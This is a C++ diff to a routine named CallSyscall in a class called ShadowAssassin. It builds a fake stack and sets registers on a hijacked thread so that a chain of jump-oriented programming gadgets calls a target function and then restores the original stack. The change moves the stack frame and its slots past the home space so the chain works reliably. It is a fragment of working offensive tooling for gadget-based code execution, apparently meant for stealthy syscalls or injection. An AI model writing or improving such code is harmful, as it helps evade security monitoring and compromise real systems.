@@ -405,21 +405,22 @@ UINT64 ShadowAssassin::CallSyscall(const std::string& name, const std::vector<UI
 	frameManager.WriteRegister("rsi", jopManager.GetRsi());
 	frameManager.WriteRegister("rip", jopManager.GetRip());
 
-	// Stack layout when chain fires (RSP = newRsp+0x10):
-	//   [newRsp+0x18] = originalRsp   ← gadget4 pop rsp restores real stack
-	//   [newRsp+0x10] = rdx_value     ← gadget2 pop rdx reads this (after target returns)
-	//   [newRsp+0x08] = return addr   ← gadget1 call pushes here (clobbers, don't care)
-	//   [newRsp .. ]  = real stack, function grows into this
+	// Stack layout (RSP starts at newRsp+0x58):
+	//   [newRsp+0x60] = originalRsp    ← gadget4 pop rsp restores real stack
+	//   [newRsp+0x58] = rdx_value      ← gadget2 pop rdx (above home space, safe)
+	//   [newRsp+0x50] = 0              ← gadget1 call pushes return addr here
+	//   [newRsp+0x30..+0x50] = function's 32-byte home space (can be clobbered)
+	//   [newRsp .. +0x30] = function locals / pushes (~900 bytes free)
 	UINT64 originalRsp = frameManager.ReadStoredRegister("rsp");
-	UINT64 newRsp = originalRsp - 0x200;
+	UINT64 newRsp = originalRsp - 0x400; // 1KB below real RSP — plenty of room
 
-	writeFn(newRsp + 0x18, originalRsp);
-	writeFn(newRsp + 0x10, jopManager.GetRdx());
-	writeFn(newRsp + 0x08, 0);  // call will overwrite with return addr
+	writeFn(newRsp + 0x60, originalRsp);
+	writeFn(newRsp + 0x58, jopManager.GetRdx());
+	writeFn(newRsp + 0x50, 0);  // call overwrites with return addr
 
-	frameManager.WriteRegister("rsp", newRsp + 0x10);
-	DbgLog("[CallSyscall] rsp=0x%llX rdx_slot=0x%llX orig_rsp_slot=0x%llX\n",
-		newRsp + 0x10, newRsp + 0x10, newRsp + 0x18);
+	frameManager.WriteRegister("rsp", newRsp + 0x58);
+	DbgLog("[CallSyscall] rsp=0x%llX rdx_slot=0x%llX orig_rsp_slot=0x%llX rdx_val=0x%llX\n",
+		newRsp + 0x58, newRsp + 0x58, newRsp + 0x60, jopManager.GetRdx());
 
 
     UINT64 current_rip = frameManager.ReadRegister("rip");
